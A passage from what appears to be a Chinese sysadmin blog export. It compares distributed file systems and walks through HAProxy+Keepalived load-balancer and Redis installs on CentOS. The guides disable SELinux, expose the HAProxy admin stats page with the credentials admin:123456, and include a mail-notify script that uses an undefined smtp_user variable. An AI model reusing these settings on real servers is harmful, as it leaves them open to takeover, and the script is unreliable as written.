<p><a href="http://portal.ucweb.local/docz/spec/platform/datastore/fastdfs" target="_blank" rel="noopener">http://portal.ucweb.local/docz/spec/platform/datastore/fastdfs</a></p>
</li>
</ul>
<h2 id="MooseFS"><a href="#MooseFS" class="headerlink" title="MooseFS"></a><strong>MooseFS</strong></h2><p>MooseFS是一个高可用的故障容错分布式文件系统，它支持通过FUSE方式将文件挂载操作，同时其提供的web管理界面非常方便查看当前的文件存储状态。</p>
<ul>
<li><strong>特性</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）从下图中我们可以看到MooseFS文件系统由四部分组成：Managing Server 、Data Server 、Metadata Backup Server 及Client</span><br><span class="line">2）其中所有的元数据都是由Managing Server管理，为了提高整个系统的可用性，Metadata Backup Server记录文件元数据操作日志，用于数据的及时恢复</span><br><span class="line">3）Data Server可以分布式部署，存储的数据是以块的方式分布至各存储节点的，因此提升了系统的整体性能，同时Data Server提供了冗余备份的能力，提升系统的可靠性</span><br><span class="line">4）Client通过FUSE方式挂载，提供了类似POSIX的访问方式，从而降低了Client端的开发难度，增强系统的通用性</span><br></pre></td></tr></table></figure>

<p><img src="/articles/455d7de6/3.png" alt="img"></p>
<ul>
<li>元数据服务器（master）:负责各个数据存储服务器的管理，文件读写调度，文件空间回收以及恢复</li>
<li>元数据日志服务器（metalogger）:负责备份master服务器的变化日志文件，以便于在master server出问题的时候接替其进行工作</li>
<li>数据存储服务器（chunkserver）:数据实际存储的地方，由多个物理服务器组成，负责连接管理服务器，听从管理服务器调度，提供存储空间，并为客户提供数据传输；多节点拷贝;在数据存储目录，看不见实际的数据</li>
</ul>
<p><img src="/articles/455d7de6/4.png" alt="img"></p>
<ul>
<li><strong>优点</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）部署安装非常简单，管理方便</span><br><span class="line">2）支持在线扩容机制，增强系统的可扩展性</span><br><span class="line">3）实现了软RAID，增强系统的 并发处理能力及数据容错恢复能力</span><br><span class="line">4）数据恢复比较容易，增强系统的可用性5）有回收站功能，方便业务定制</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>缺点</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）存在单点性能瓶颈及单点故障</span><br><span class="line">2）MFS Master节点很消耗内存</span><br><span class="line">3）对于小于64KB的文件，存储利用率较低</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>应用场景</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）单集群部署的应用</span><br><span class="line">2）中、大型文件</span><br></pre></td></tr></table></figure>

<ul>
<li><p>参考</p>
<p><a href="http://portal.ucweb.local/docz/spec/platform/datastore/moosefsh" target="_blank" rel="noopener">http://portal.ucweb.local/docz/spec/platform/datastore/moosefsh</a> </p>
<p><a href="http://www.moosefs.org/" target="_blank" rel="noopener">http://www.moosefs.org/</a> </p>
<p><a href="http://sourceforge.net/projects/moosefs/?source=directory" target="_blank" rel="noopener">http://sourceforge.net/projects/moosefs/?source=directory</a></p>
</li>
</ul>
<h2 id="GlusterFS"><a href="#GlusterFS" class="headerlink" title="GlusterFS"></a><strong>GlusterFS</strong></h2><p>GlusterFS是Red Hat旗下的一款开源分布式文件系统，它具备高扩展、高可用及高性能等特性，由于其无元数据服务器的设计，使其真正实现了线性的扩展能力，使存储总容量可 轻松达到PB级别，支持数千客户端并发访问；对跨集群，其强大的Geo-Replication可以实现集群间数据镜像，而且是支持链式复制，这非常适用 于垮集群的应用场景</p>
<ul>
<li><strong>特性</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）目前GlusterFS支持FUSE方式挂载，可以通过标准的NFS/SMB/CIFS协议像访问本体文件一样访问文件系统，同时其也支持HTTP/FTP/GlusterFS访问，同时最新版本支持接入Amazon的AWS系统</span><br><span class="line">2）GlusterFS系统通过基于SSH的命令行管理界面，可以远程添加、删除存储节点，也可以监控当前存储节点的使用状态</span><br><span class="line">3）GlusterFS支持集群节点中存储虚拟卷的扩容动态扩容；同时在分布式冗余模式下，具备自愈管理功能，在Geo冗余模式下，文件支持断点续传、异步传输及增量传送等特点</span><br></pre></td></tr></table></figure>

<p><img src="/articles/455d7de6/5.jpg" alt></p>
<ul>
<li><strong>优点</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）系统支持POSIX(可移植操作系统)，支持FUSE挂载通过多种协议访问，通用性比较高</span><br><span class="line">2）支持在线扩容机制，增强系统的可扩展性</span><br><span class="line">3）实现了软RAID，增强系统的 并发处理能力及数据容错恢复能力</span><br><span class="line">4）强大的命令行管理，降低学习、部署成本</span><br><span class="line">5）支持整个集群镜像拷贝，方便根据业务压力，增加集群节点</span><br><span class="line">6）官方资料文档专业化，该文件系统由Red Hat企业级做维护，版本质量有保障</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>缺点</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）通用性越强，其跨越的层次就越多，影响其IO处理效率</span><br><span class="line">2）频繁读写下，会产生垃圾文件，占用磁盘空间</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>应用场景</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）多集群部署的应用</span><br><span class="line">2）中大型文件根据目前官方提供的材料，现有的使用GlusterFS系统存储容量可轻松达到PB</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>术语：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brick：分配到卷上的文件系统块；</span><br><span class="line">client：挂载卷，并对外提供服务；</span><br><span class="line">server：实际文件存储的地方；</span><br><span class="line">subvolume：被转换过的文件系统块；</span><br><span class="line">volume：最终转换后的文件系统卷。</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>参考</strong></p>
<p><a href="http://www.gluster.org/" target="_blank" rel="noopener">http://www.gluster.org/</a></p>
<p><a href="http://www.gluster.org/wp-content/uploads/2012/05/Gluster_File_System-3.3.0-Administration_Guide-en-US.pdf" target="_blank" rel="noopener">http://www.gluster.org/wp-content/uploads/2012/05/Gluster_File_System-3.3.0-Administration_Guide-en-US.pdf</a></p>
<p><a href="http://blog.csdn.net/liuben/article/details/6284551" target="_blank" rel="noopener">http://blog.csdn.net/liuben/article/details/6284551</a></p>
</li>
</ul>
<h2 id="Ceph"><a href="#Ceph" class="headerlink" title="Ceph"></a><strong>Ceph</strong></h2><p>Ceph是一个可以按对象/块/文件方式存储的开源分布式文件系统，其设计之初，就将单点故障作为首先要解决的问题，因此该系统具备高可用性、高性能及可 扩展等特点。该文件系统支持目前还处于试验阶段的高性能文件系统BTRFS(B-Tree文件系统)，同时支持按OSD方式存储，因此其性能是很卓越的， 因为该系统处于试商用阶段，需谨慎引入到生产环境</p>
<ul>
<li><strong>特性</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）Ceph底层存储是基于RADOS（可靠的、自动的分布式对象存储），它提供了LIBRADOS/RADOSGW/RBD/CEPH FS方式访问底层的存储系统，如下图所示</span><br><span class="line">2）通过FUSE，Ceph支持类似的POSIX访问方式；Ceph分布式系统中最关键的MDS节点是可以部署多台，无单点故障的问题，且处理性能大大提升</span><br><span class="line">3）Ceph通过使用CRUSH算法动态完成文件inode number到object number的转换，从而避免再存储文件metadata信息，增强系统的灵活性</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>优点</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）支持对象存储（OSD）集群，通过CRUSH算法，完成文件动态定位， 处理效率更高</span><br><span class="line">2）支持通过FUSE方式挂载，降低客户端的开发成本，通用性高</span><br><span class="line">3）支持分布式的MDS/MON，无单点故障</span><br><span class="line">4）强大的容错处理和自愈能力5）支持在线扩容和冗余备份，增强系统的可靠性</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>缺点</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）目前处于试验阶段，系统稳定性有待考究</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>应用场景</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）全网分布式部署的应用</span><br><span class="line">2）对实时性、可靠性要求比较高官方宣传，存储容量可轻松达到PB级别</span><br></pre></td></tr></table></figure>



<p> <strong>源码路径：</strong><a href="https://github.com/ceph/ceph" target="_blank" rel="noopener">https://github.com/ceph/ceph</a></p>
<ul>
<li><p><strong>参考</strong></p>
<p><a href="http://ceph.com/" target="_blank" rel="noopener">http://ceph.com/</a></p>
</li>
</ul>
<h2 id="MogileFS"><a href="#MogileFS" class="headerlink" title="MogileFS"></a><strong>MogileFS</strong></h2><ul>
<li><p>开发语言：perl</p>
</li>
<li><p>开源协议：GPL</p>
</li>
<li><p>依赖数据库</p>
</li>
<li><p>Trackers(控制中心):负责读写数据库，作为代理复制storage间同步的数据</p>
</li>
<li><p>Database:存储源数据（默认mysql）</p>
</li>
<li><p>Storage:文件存储</p>
</li>
<li><p>除了API，可以通过与nginx集成，对外提供下载服务</p>
</li>
</ul>
<p> <strong>源码路径：</strong><a href="https://github.com/mogilefs" target="_blank" rel="noopener">https://github.com/mogilefs</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Keepalived+Haproxy搭建四层负载均衡器</title>
    <url>/articles/95471f15.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        Haproxy是稳定、高性能、高可用性的负载均衡解决方案，支持HTTP及TCP代理后端服务器池，因支持强大灵活的7层acl规则，广泛作为HTTP反向代理。本文则详细介绍如何利用它的四层交换与Keepalived实现一个负载均衡器，适用于Socket、ICE、Mail、Mysql、私有通讯等任意TCP服务。系统架构图如下：</p>
<p><img src="/articles/95471f15/0.027865917857136546.png" alt="点击在新窗口中浏览此图片"></p>
<a id="more"></a>



<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>OS:    Centos6.x(64X)<br>MASTER:   192.168.0.20<br>BACKUP:   192.168.0.21<br>VIP:  192.168.0.100<br>Serivce Port: 11231</p>
<h2 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h2><h4 id="添加非本机IP邦定支持"><a href="#添加非本机IP邦定支持" class="headerlink" title="添加非本机IP邦定支持"></a><strong>添加非本机IP邦定支持</strong></h4><p>#vim  /etc/sysctl.conf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net.ipv4.ip_nonlocal_bind=1</span><br><span class="line"></span><br><span class="line"><span class="comment">#sysctl –p</span></span><br></pre></td></tr></table></figure>

<h4 id="配置平台日志支持"><a href="#配置平台日志支持" class="headerlink" title="配置平台日志支持"></a>配置平台日志支持</h4><p>#vim  /etc/syslog.conf  添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local3.*        /var/log/haproxy.log</span><br><span class="line">local0.*        /var/log/haproxy.log</span><br></pre></td></tr></table></figure>

<p>#vim /etc/sysconfig/syslog</p>
<p>修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SYSLOGD_OPTIONS=&quot;-r -m 0&quot;</span><br></pre></td></tr></table></figure>

<p>#/etc/init.d/syslog restart</p>
<h4 id="关闭SELINUX"><a href="#关闭SELINUX" class="headerlink" title="关闭SELINUX"></a>关闭SELINUX</h4><p>vim /etc/sysconfig/selinux<br>修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELINUX=disabled</span><br></pre></td></tr></table></figure>

<p>#setenforce 0</p>
<h4 id="配置iptables"><a href="#配置iptables" class="headerlink" title="配置iptables"></a>配置iptables</h4><p>添加VRRP通讯支持</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -d 224.0.0.18 -j ACCEPT</span><br></pre></td></tr></table></figure>

<h4 id="Keepalived的安装、配置"><a href="#Keepalived的安装、配置" class="headerlink" title="Keepalived的安装、配置"></a>Keepalived的安装、配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mkdir -p /home/install/keepalivedha</span></span><br><span class="line"><span class="comment">#cd /home/install/keepalivedha</span></span><br><span class="line"><span class="comment">#wget http://www.keepalived.org/software/keepalived-1.2.2.tar.gz</span></span><br><span class="line"><span class="comment">#tar zxvf keepalived-1.2.2.tar.gz</span></span><br><span class="line"><span class="comment">#cd keepalived-1.2.2</span></span><br><span class="line"><span class="comment">#./configure</span></span><br><span class="line"><span class="comment">#make &amp;&amp; make install</span></span><br><span class="line"><span class="comment">#cp /usr/local/etc/rc.d/init.d/keepalived /etc/rc.d/init.d/</span></span><br><span class="line"><span class="comment">#cp /usr/local/etc/sysconfig/keepalived /etc/sysconfig/</span></span><br><span class="line"><span class="comment">#mkdir /etc/keepalived</span></span><br><span class="line"><span class="comment">#cp /usr/local/etc/keepalived/keepalived.conf /etc/keepalived/</span></span><br><span class="line"><span class="comment">#cp /usr/local/sbin/keepalived /usr/sbin/</span></span><br></pre></td></tr></table></figure>

<p>#vim  /etc/keepalived/keepalived.conf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">! Configuration File for keepalived </span><br><span class="line"></span><br><span class="line">global_defs &#123;  </span><br><span class="line">   notification_email &#123;  </span><br><span class="line">         liutiansi@gmail.com  </span><br><span class="line">   &#125;  </span><br><span class="line">   notification_email_from liutiansi@gmail.com  </span><br><span class="line">   smtp_connect_timeout 3  </span><br><span class="line">   smtp_server 127.0.0.1  </span><br><span class="line">   router_id LVS_DEVEL  </span><br><span class="line">&#125;  </span><br><span class="line">vrrp_script chk_haproxy &#123;  </span><br><span class="line">    script &quot;killall -0 haproxy&quot;  </span><br><span class="line">    interval 2  </span><br><span class="line">    weight 2  </span><br><span class="line">&#125;  </span><br><span class="line">vrrp_instance VI_1 &#123;  </span><br><span class="line">    interface eth1  </span><br><span class="line">    state MASTER # 从为BACKUP  </span><br><span class="line">    priority 101 # 从为100  </span><br><span class="line">    virtual_router_id 50 #路由ID，可通过#tcpdump vrrp查看。  </span><br><span class="line">    garp_master_delay 1 #主从切换时间，单位为秒。  </span><br><span class="line">  </span><br><span class="line">    authentication &#123;  </span><br><span class="line">        auth_type PASS  </span><br><span class="line">        auth_pass KJj23576hYgu23IP  </span><br><span class="line">    &#125;  </span><br><span class="line">    track_interface &#123;  </span><br><span class="line">       eth0  </span><br><span class="line">       eth1  </span><br><span class="line">    &#125;  </span><br><span class="line">    virtual_ipaddress &#123;  </span><br><span class="line">        192.168.0.100  </span><br><span class="line">    &#125;  </span><br><span class="line">    track_script &#123;  </span><br><span class="line">        chk_haproxy  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    #状态通知  </span><br><span class="line">    notify_master &quot;/etc/keepalived/Mailnotify.py master&quot;  </span><br><span class="line">    notify_backup &quot;/etc/keepalived/Mailnotify.py backup&quot;  </span><br><span class="line">    notify_fault &quot;/etc/keepalived/Mailnotify.py fault&quot;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Haproxy的安装与配置"><a href="#Haproxy的安装与配置" class="headerlink" title="Haproxy的安装与配置"></a>Haproxy的安装与配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#cd /home/install/keepalivedha</span><br><span class="line">#wget http://haproxy.1wt.eu/download/1.4/src/haproxy-1.4.11.tar.gz</span><br><span class="line">#tar -zxvf haproxy-1.4.11.tar.gz</span><br><span class="line">#cd haproxy-1.4.11</span><br><span class="line">#make install</span><br><span class="line">#mkdir -p /usr/local/haproxy/etc</span><br><span class="line">#mkdir -p /usr/local/haproxy/sbin</span><br><span class="line">#cp examples/haproxy.cfg /usr/local/haproxy/etc</span><br><span class="line">#ln -s /usr/local/sbin/haproxy /usr/local/haproxy/sbin/haproxy</span><br></pre></td></tr></table></figure>

<p>#vim  /usr/local/haproxy/etc/haproxy.cfg</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># this config needs haproxy-1.1.28 or haproxy-1.2.1</span><br><span class="line">global  </span><br><span class="line">#        log 127.0.0.1   local0  </span><br><span class="line">        log 127.0.0.1   local1 notice  </span><br><span class="line">        maxconn 5000  </span><br><span class="line">        uid 99  </span><br><span class="line">        gid 99  </span><br><span class="line">        daemon  </span><br><span class="line">        pidfile /usr/local/haproxy/haproxy.pid  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">defaults  </span><br><span class="line">        log     global  </span><br><span class="line">        mode    http  </span><br><span class="line">        #option httplog  </span><br><span class="line">        option  dontlognull  </span><br><span class="line">        retries 3  </span><br><span class="line">        option redispatch  </span><br><span class="line">        maxconn 2000  </span><br><span class="line">        contimeout      5000  </span><br><span class="line">        clitimeout      50000  </span><br><span class="line">        srvtimeout      50000  </span><br><span class="line">  </span><br><span class="line">listen  ICE01   192.168.0.100:11231  </span><br><span class="line">        mode tcp #配置TCP模式  </span><br><span class="line">        maxconn 2000  </span><br><span class="line">        balance roundrobin  </span><br><span class="line">        server  ice-192.168.0.128 192.168.0.128:11231 check inter 5000 fall 1 rise 2  </span><br><span class="line">        server  ice-192.168.0.129 192.168.0.129:11231 check inter 5000 fall 1 rise 2  </span><br><span class="line">        server  ice-192.168.0.130 192.168.0.130:11231 check inter 5000 fall 1 rise 2  </span><br><span class="line">        server  ice-192.168.0.131 192.168.0.131:11231 check inter 5000 fall 1 rise 2  </span><br><span class="line">        server  ice-192.168.0.132 192.168.0.132:11231 check inter 5000 fall 1 rise 2  </span><br><span class="line">        server  ice-192.168.0.34 192.168.0.34:11231 check inter 5000 fall 1 rise 2  </span><br><span class="line">        srvtimeout      20000  </span><br><span class="line">  </span><br><span class="line">listen stats_auth 192.168.0.20:80  </span><br><span class="line"># listen stats_auth 192.168.0.21:80 # backup config  </span><br><span class="line">        stats enable  </span><br><span class="line">        stats uri  /admin-status #管理地址  </span><br><span class="line">        stats auth  admin:123456 #管理帐号:管理密码  </span><br><span class="line">        stats admin if TRUE</span><br></pre></td></tr></table></figure>

<h4 id="邮件通知程序-python实现"><a href="#邮件通知程序-python实现" class="headerlink" title="邮件通知程序(python实现)"></a>邮件通知程序(python实现)</h4><p>#vim  /etc/keepalived/Mailnotify.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python  </span></span><br><span class="line"><span class="comment">#coding: utf-8  </span></span><br><span class="line"><span class="keyword">from</span> email.MIMEMultipart <span class="keyword">import</span> MIMEMultipart  </span><br><span class="line"><span class="keyword">from</span> email.MIMEText <span class="keyword">import</span> MIMEText  </span><br><span class="line"><span class="keyword">from</span> email.MIMEImage <span class="keyword">import</span> MIMEImage  </span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> smtplib  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#---------------------------------------------------------------  </span></span><br><span class="line"><span class="comment"># Name:        Mailnotify.py  </span></span><br><span class="line"><span class="comment"># Purpose:     Mail notify to SA  </span></span><br><span class="line"><span class="comment"># Author:      Liutiansi  </span></span><br><span class="line"><span class="comment"># Email:       liutiansi@gamil.com  </span></span><br><span class="line"><span class="comment"># Created:     2011/03/09  </span></span><br><span class="line"><span class="comment"># Copyright:   (c) 2011  </span></span><br><span class="line"><span class="comment">#--------------------------------------------------------------  </span></span><br><span class="line">strFrom = <span class="string">'admin@domain.com'</span>  </span><br><span class="line">strTo = <span class="string">'liutiansi@gmail.com'</span>  </span><br><span class="line">smtp_server=<span class="string">'smtp.domain.com'</span>  </span><br><span class="line">smtp_pass=<span class="string">'123456'</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]!=<span class="string">"master"</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>]!=<span class="string">"backup"</span>  <span class="keyword">and</span> sys.argv[<span class="number">1</span>]!=<span class="string">"fault"</span>:  </span><br><span class="line">    sys.exit()  </span><br><span class="line"><span class="keyword">else</span>:  </span><br><span class="line">    notify_type=sys.argv[<span class="number">1</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">mail_title=<span class="string">'[紧急]负载均衡器邮件通知'</span>  </span><br><span class="line">mail_body_plain=notify_type+<span class="string">'被激活，请做好应急处理。'</span>  </span><br><span class="line">mail_body_html=<span class="string">'&lt;b&gt;&lt;font color=red&gt;'</span>+notify_type+<span class="string">'被激活，请做好应急处理。&lt;/font&gt;&lt;/b&gt;'</span>  </span><br><span class="line">  </span><br><span class="line">msgRoot = MIMEMultipart(<span class="string">'related'</span>)  </span><br><span class="line">msgRoot[<span class="string">'Subject'</span>] =Header(mail_title,<span class="string">'utf-8'</span>)  </span><br><span class="line">msgRoot[<span class="string">'From'</span>] = strFrom  </span><br><span class="line">msgRoot[<span class="string">'To'</span>] = strTo  </span><br><span class="line">  </span><br><span class="line">msgAlternative = MIMEMultipart(<span class="string">'alternative'</span>)  </span><br><span class="line">msgRoot.attach(msgAlternative)  </span><br><span class="line">  </span><br><span class="line">msgText = MIMEText(mail_body_plain, <span class="string">'plain'</span>, <span class="string">'utf-8'</span>)  </span><br><span class="line">msgAlternative.attach(msgText)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">msgText = MIMEText(mail_body_html, <span class="string">'html'</span>,<span class="string">'utf-8'</span>)  </span><br><span class="line">msgAlternative.attach(msgText)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">smtp = smtplib.SMTP()  </span><br><span class="line">smtp.connect(smtp_server)  </span><br><span class="line">smtp.login(smtp_user,smtp_pass)  </span><br><span class="line">smtp.sendmail(strFrom, strTo, msgRoot.as_string())  </span><br><span class="line">smtp.quit()</span><br></pre></td></tr></table></figure>

<p>注：修改成系统python实际路径“#!/usr/local/bin/python”(第一行)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#chmod +x /etc/keepalived/Mailnotify.py</span><br><span class="line">#/usr/local/haproxy/sbin/haproxy -f /usr/local/haproxy/etc/haproxy.cfg</span><br><span class="line">#service keepalived start</span><br></pre></td></tr></table></figure>

<h4 id="查看VRRP通讯记录"><a href="#查看VRRP通讯记录" class="headerlink" title="查看VRRP通讯记录"></a>查看VRRP通讯记录</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#tcpdump vrrp</span><br><span class="line"></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes</span><br><span class="line">15:49:05.270017  IP 192.168.0.20 &gt; VRRP.MCAST.NET: VRRPv2, Advertisement, vrid 50,  prio 100, authtype simple, intvl 1s, length 20</span><br></pre></td></tr></table></figure>

<h2 id="Haproxy界面"><a href="#Haproxy界面" class="headerlink" title="Haproxy界面"></a>Haproxy界面</h2><p>访问<a href="http://192.168.0.20/admin-status，输入帐号admin密码123456进入管理监控平台。" target="_blank" rel="noopener">http://192.168.0.20/admin-status，输入帐号admin密码123456进入管理监控平台。</a></p>
<p><img src="/articles/95471f15/0.39497361121703545.png" alt="点击在新窗口中浏览此图片"></p>
<p>haproxy-1.4.9以后版本最大的亮点是添加了手工启用/禁用功能，对升级变更应用时非常有用。</p>
<h2 id="邮件通知"><a href="#邮件通知" class="headerlink" title="邮件通知"></a>邮件通知</h2><p><img src="/articles/95471f15/0.6085717838496976.png" alt="点击在新窗口中浏览此图片"></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Haproxy</tag>
        <tag>Keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7安装redis教程</title>
    <url>/articles/39f481b5.html</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过wget方式直接在linux上下载Redis</span></span><br><span class="line">wget http://download.redis.io/releases/redis-4.0.9.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#解压下载的redis-2.6.17.tar.gz 文件</span></span><br><span class="line">tar xzf redis-4.0.9.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#进入解压后的文件夹</span></span><br><span class="line"><span class="built_in">cd</span>  redis-4.0.9</span><br><span class="line"></span><br><span class="line"><span class="comment">#编译安装</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><ul>
<li><p>通过执行src文件夹下的redis-server，可以启动redis服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./src/redis-server</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过执行src文件夹下的redis-cli， 可以访问redis服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./src/redis-cli</span><br><span class="line">redis&gt; <span class="built_in">set</span> foo bar</span><br><span class="line">Ok</span><br><span class="line">redis&gt; get foo</span><br><span class="line"><span class="string">"bar"</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="排错"><a href="#排错" class="headerlink" title="排错"></a><strong>排错</strong></h2><p>CentOS5.7默认没有安装gcc，这会导致我们无法make成功。使用yum安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install gcc</span><br></pre></td></tr></table></figure>

<p>make时报如下错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zmalloc.h:50:31: error: jemalloc/jemalloc.h: No such file or directory</span><br><span class="line">zmalloc.h:55:2: error: #error &quot;Newer version of jemalloc required&quot;</span><br><span class="line">make[1]: *** [adlist.o] Error 1</span><br><span class="line">make[1]: Leaving directory `/data0/src/redis-2.6.2/src&apos;</span><br><span class="line">make: *** [all] Error 2</span><br></pre></td></tr></table></figure>

<p>原因是jemalloc重载了Linux下的ANSI C的malloc和free函数。解决办法：make时添加参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make MALLOC=libc</span><br></pre></td></tr></table></figure>

<p>make之后，会出现一句提示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hint: To run <span class="string">'make test'</span> is a good idea ;)</span><br></pre></td></tr></table></figure>

<p>但是不测试，通常是可以使用的。若我们运行make test ，会有如下提示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[devnote@devnote src]$ make <span class="built_in">test</span></span><br><span class="line">You need tcl 8.5 or newer <span class="keyword">in</span> order to run the Redis <span class="built_in">test</span></span><br><span class="line">make: ***[<span class="built_in">test</span>] Error_1</span><br></pre></td></tr></table></figure>

<p>解决办法是用yum安装tcl8.5（或去tcl的官方网站<a href="http://www.tcl.tk/下载8.5版本，并参考官网介绍进行安装）" target="_blank" rel="noopener">http://www.tcl.tk/下载8.5版本，并参考官网介绍进行安装）</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install tcl</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>haproxy+keepalived实现Web服务器负载均衡</title>
    <url>/articles/c0e454fd.html</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><strong>操作系统</strong>：CentOS 6.X 64位</p>
<p><strong>Web服务器</strong>：192.168.21.127、192.168.21.128</p>
<p><strong>站点</strong>：bbs.osyunwei.com和sns.osyunwei.com部署在两台Web服务器上</p>
<h2 id="实现目的"><a href="#实现目的" class="headerlink" title="实现目的"></a><strong>实现目的</strong></h2><p>增加两台服务器（主主模式），通过HAProxy+Keepalived实现Web服务器负载均衡</p>
<h2 id="架构规划"><a href="#架构规划" class="headerlink" title="架构规划"></a><strong>架构规划</strong></h2><p>HAProxy服务器：192.168.21.129、192.168.21.130</p>
<p>虚拟服务器（VIP）：192.168.21.253、192.168.21.254</p>
<h2 id="验证说明"><a href="#验证说明" class="headerlink" title="验证说明"></a><strong>验证说明</strong></h2><ol>
<li>VIP：192.168.21.253指向192.168.21.129；VIP：192.168.21.254指向192.168.21.130；</li>
<li>当192.168.21.129宕机时，VIP：192.168.21.253漂移到192.168.21.130上；</li>
<li>当192.168.21.130宕机时，VIP：192.168.21.254漂移到192.168.21.129上；</li>
</ol>
<p>这样的主主模式好处是，两台服务器在提供服务的同时，又互为对方的备份服务器。</p>
<a id="more"></a>

<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a><strong>操作步骤</strong></h2><p><strong>两台HAProxy服务器上分别操作</strong></p>
<h4 id="关闭SElinux"><a href="#关闭SElinux" class="headerlink" title="关闭SElinux"></a>关闭SElinux</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/selinux/config</span><br><span class="line"></span><br><span class="line"><span class="comment">#SELINUX=enforcing #注释掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#SELINUXTYPE=targeted #注释掉</span></span><br><span class="line"></span><br><span class="line">SELINUX=disabled <span class="comment">#增加</span></span><br><span class="line"></span><br><span class="line">:wq!  <span class="comment">#保存退出</span></span><br><span class="line"></span><br><span class="line">setenforce 0 <span class="comment">#使配置立即生效</span></span><br></pre></td></tr></table></figure>

